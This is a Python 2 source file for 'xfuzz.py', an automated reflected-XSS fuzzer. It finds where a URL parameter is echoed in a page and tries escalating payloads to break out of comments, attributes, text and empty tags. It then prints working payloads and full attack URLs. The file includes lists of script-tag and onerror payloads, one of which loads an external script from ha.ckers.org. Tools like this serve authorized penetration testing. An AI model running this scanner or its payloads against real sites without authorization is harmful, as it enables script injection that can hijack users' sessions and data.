#!/usr/bin/env python
from urlparse import urlparse, parse_qs
from HTMLParser import HTMLParser
import urllib
import urllib2
import sys
import re

XSSCHECKVAL = "CHECKXSSHERE"      #Must be plaintext word unlikely to appear on the page
URL = ""
NUM_REFLECTIONS = 0           

CURRENTLY_OPEN_TAGS = []      
OPEN_TAGS = []                
OPEN_EMPTY_TAG = ""
TAGS_TO_IGNORE = ['html','body','br']   
TAG_WHITELIST = ['input', 'textarea']             

OCCURENCE_NUM = 0
OCCURENCE_PARSED = 0
LIST_OF_PAYLOADS = []

FUZZING_PAYLOADS_BASE = [
    "<script>alert(1)</script>",
    "<sCriPt>alert(1);</sCriPt>",
    "<script src=http://ha.ckers.org/xss.js></script>",
    "<script>alert(String.fromCharCode(88,83,83));</script>",
    "<IMG \"\"\"><script>alert(\"XSS\")</script>\">",
    "<img src=\"blah.jpg\" onerror=\"alert('XSS')\"/>"
]

FUZZING_PAYLOADS_START_END_TAG = [
    "\"/><script>alert(1)</script>",
    "\"\/><img src=\"blah.jpg\" onerror=\"alert('XSS')\"/>",
    "\"\/><img src=\"blahjpg\" onerror=\"alert('XSS')\"/>"
]

FUZZING_PAYLOADS_ATTR = [
    "\"><script>alert(1)</script>",
    "\"><img src=\"blah.jpg\" onerror=\"alert('XSS')\"/>",
    "'><script>alert(1)</script>"
]

#######################################################################################################################
# MAIN FUNCTION
#######################################################################################################################
def main():    
    if (len(sys.argv) != 2 or XSSCHECKVAL not in sys.argv[1]):
        exit("Usage: python xfuzz.py <FULL URL REPLACING PARAM WITH " + XSSCHECKVAL + ">\nExample: python xfuzz.py http://site.com/?param=" + XSSCHECKVAL + "\n")
    global URL
    URL = sys.argv[1]
    
    init_resp = make_request(URL)
    print "[+] Loaded URL!"
    
    if(XSSCHECKVAL.lower() in init_resp.lower()):
        global NUM_REFLECTIONS
        NUM_REFLECTIONS = init_resp.lower().count(XSSCHECKVAL.lower())
        print "[+] Response contains parameter value! Reflected in code " + str(NUM_REFLECTIONS) + " time(s)."
        
    else:
        exit("[-] ERROR. Check value not in response. Nothing to test. Exiting...\n")
    
    for i in range(NUM_REFLECTIONS):
        print "\n############################\nTESTING OCCURENCE NUMBER: " + str(i + 1) + "\n############################\n"
        global OCCURENCE_NUM
        OCCURENCE_NUM = i+1
        scan_occurence(init_resp)
        global ALLOWED_CHARS, IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG, CURRENTLY_OPEN_TAGS, OPEN_TAGS, OCCURENCE_PARSED, OPEN_EMPTY_TAG
        ALLOWED_CHARS, CURRENTLY_OPEN_TAGS, OPEN_TAGS = [], [], []
        IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG = False, False, False, False, False
        OCCURENCE_PARSED = 0
        OPEN_EMPTY_TAG = ""
    
    print "\n##########################################\n[+] Scan complete. Full list of possible payloads:"
    for payload in LIST_OF_PAYLOADS:
        print payload

    print "############################################"

def scan_occurence(init_resp):
    print "Checking for location of " + XSSCHECKVAL + "..."
    location = html_parse(init_resp)
    if(location == "comment"):
        print "[+] Found in an HTML comment."
        break_comment()
    elif(location == "script_data"):
        print "[+] Found as data in a script tag."
    elif(location == "html_data"):
        print "[+] Found as data or plaintext on the page."
        break_data()
    elif(location == "start_end_tag_attr"):
        print "[+] Found as an attribute in an empty tag."
        break_start_end_attr()
    elif(location == "attr"):
        print "[+] Found as an attribute in an HTML tag."
        break_attr()

def html_parse(init_resp):
    parser = MyHTMLParser()
    location = ""
    try:
        parser.feed(init_resp)
    except Exception as e:
        location = str(e)
    except:
        print "[-] ERROR. Try rerunning?"
    return location

def test_param_check(param_to_check, param_to_compare):
    check_string = "XSSSTART" + param_to_check + "XSSEND"
    compare_string = "XSSSTART" + param_to_compare + "XSSEND"
    check_url = URL.replace(XSSCHECKVAL, check_string)
    try:
        check_response = make_request(check_url)
    except:
        check_response = ""
    success = False
    
    occurence_counter = 0
    for m in re.finditer('XSSSTART', check_response, re.IGNORECASE):
        occurence_counter += 1
        if((occurence_counter == OCCURENCE_NUM) and (check_response[m.start():m.start()+len(compare_string)].lower() == compare_string.lower())):
            success = True
            break
    return success

def make_request(in_url):
    try:
        req = urllib2.Request(in_url)
        resp = urllib2.urlopen(req)
        return resp.read()
    except:
        print "\n[-] ERROR Could not open URL. Exiting...\n"

def break_comment():
    payload = "--><script>alert(1);</script>"
    if(test_param_check(payload,payload)):
        payload = "--><script>alert(1);</script>"
        if(test_param_check(payload + "<!--",payload+"<!--")):
            payload = "--><script>alert(1);</script><!--"
    else:
        if(test_param_check("-->", "-->")):
            clean = test_param_check("<!--", "<!--")
            found = False
            for pl in FUZZING_PAYLOADS_BASE:
                pl = "-->" + pl
                if(clean):
                    pl = pl + "<!--"
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    payload = pl
                    LIST_OF_PAYLOADS.append(pl) #######################################################################################################################
                    found = True
                    break
            if(not found):
                print "[-] ERROR. No successful fuzzing attacks. Check manually to confirm."
        else:
            payload = ""
            print "[-] ERROR. Cannot escape comment because the --> string needed to close the comment is escaped."
            
    if(payload):
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print "[+] SUCCESS. Parameter was reflected in a comment. Use the following payload to break out:"
        print payload
        print "[+] Full URL Encoded: " + URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))
    
def break_data():
    payload = "<script>alert(1);</script>"
    if("textarea" in CURRENTLY_OPEN_TAGS):
        payload = "</textarea>" + payload
    if("title" in CURRENTLY_OPEN_TAGS):
        payload = "</title>" + payload
    if(test_param_check(payload,payload)):
        payload = payload
    else:
        found = False
        for pl in FUZZING_PAYLOADS_BASE:
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
        if(not found):
            payload = ""
            print "[-] ERROR. No successful fuzzing attacks. Check manually to confirm."

    if(payload):
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print "[+] SUCCESS. Parameter was reflected in data or plaintext. Use the following payload to break out:"
        print payload
        print "[+] Full URL Encoded: " + URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))

def break_start_end_attr():
    print "\n[Can tag attribute be escaped to execute XSS?]"
    payload = "\"/><script>alert(1);</script>"
    if(test_param_check(payload,payload)):
        payload = "\"/><script>alert(1);</script>"
        if(test_param_check(payload+"<br%20attr=\"", payload+"<br attr=\"")):
            payload = "\"/><script>alert(1);</script><br attr=\""
    else:
        if(test_param_check("/>", "/>")):
            clean = test_param_check("<br%20attr=\"", "<br attr=\"")
            found = False
            for pl in FUZZING_PAYLOADS_START_END_TAG:
                if(clean):
                    pl = pl + "<br attr=\""
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "[-] No successful fuzzing attacks. Check manually to confirm."
        else:
            print "[-] WARNING. /> cannot be used to end the empty tag. Resorting to invalid HTML."
            payloads_invalid = [
                "\"></" + OPEN_EMPTY_TAG + "><script>alert(1);</script>",
                "\"<div><script>alert(1);</script>"
                ]
            found = False
            for pl in payloads_invalid:
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "[-] ERROR! Cannot escape out of the attribute tag using all fuzzing payloads. Check manually to confirm."
            
    if(payload):
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print "[+] SUCCESS. Parameter was reflected in an attribute of an empty tag. Use the following payload to break out:"
        print payload
        print "[+] Full URL Encoded: " + URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))

def break_attr():
    payload = "\"></" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "><script>alert(1);</script>"
    if(test_param_check(payload,payload)):
        if(test_param_check(payload + "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "%20attr=\"", payload + "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\"")):
            payload = "\"></" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "><script>alert(1);</script><" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\""
    else:
        if(test_param_check("\">", "\">")):
            clean_str = "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\""
            clean = test_param_check("<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "%20attr=\"", clean_str)
            found = False
            for pl in FUZZING_PAYLOADS_ATTR:
                if(clean):
                    pl = pl + clean_str
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "[-] After trying all fuzzing attacks, none were successful. Check manually to confirm."
        else:
            print "[-] WARNING. \"> cannot be used to end the empty tag. Resorting to invalid HTML."
            payloads_invalid = [
                "\"<div><script>alert(1);</script>",
                "\"</script><script>alert(1);</script>",
                "\"</><script>alert(1);</script>",
                "\"</><script>alert(1)</script>",
                "\"<><img src=\"blah.jpg\" onerror=\"alert('XSS')\"/>",
                ]
            found = False
            for pl in payloads_invalid:
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "[-] ERROR. Cannot escape out of the attribute tag using all fuzzing payloads. Check manually to confirm."
            
    
    if(payload):
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print "[+] SUCCESS. Parameter was reflected in an attribute of an HTML tag. Use the following payload to break out:"
        print payload
        print "[+] Full URL Encoded: " + URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))
        
#HTML Parser class
class MyHTMLParser(HTMLParser):
    def handle_comment(self, data):
        global OCCURENCE_PARSED
        if(XSSCHECKVAL.lower() in data.lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
                raise Exception("comment")
    
    def handle_startendtag(self, tag, attrs):
        global OCCURENCE_PARSED
        global OCCURENCE_NUM
        global OPEN_EMPTY_TAG
        if (XSSCHECKVAL.lower() in str(attrs).lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
                OPEN_EMPTY_TAG = tag
                raise Exception("start_end_tag_attr")
            
    def handle_starttag(self, tag, attrs):
        global CURRENTLY_OPEN_TAGS
        global OPEN_TAGS
        global OCCURENCE_PARSED
        #print CURRENTLY_OPEN_TAGS
        if(tag not in TAGS_TO_IGNORE):
            CURRENTLY_OPEN_TAGS.append(tag)
        if (XSSCHECKVAL.lower() in str(attrs).lower()):
            if(tag == "script"):
                OCCURENCE_PARSED += 1
                if(OCCURENCE_PARSED == OCCURENCE_NUM):
                    raise Exception("script")
            else:
                OCCURENCE_PARSED += 1
                if(OCCURENCE_PARSED == OCCURENCE_NUM):
                    raise Exception("attr")

    def handle_endtag(self, tag):
        global CURRENTLY_OPEN_TAGS
        global OPEN_TAGS
        global OCCURENCE_PARSED
        if(tag not in TAGS_TO_IGNORE):
            CURRENTLY_OPEN_TAGS.remove(tag)
            
    def handle_data(self, data):
        global OCCURENCE_PARSED
        if (XSSCHECKVAL.lower() in data.lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
                try:
                    if(CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS)-1] == "script"):
                        raise Exception("script_data")
                    else:
                        raise Exception("html_data")
                except:
                    raise Exception("html_data")
if __name__ == "__main__":
    main()
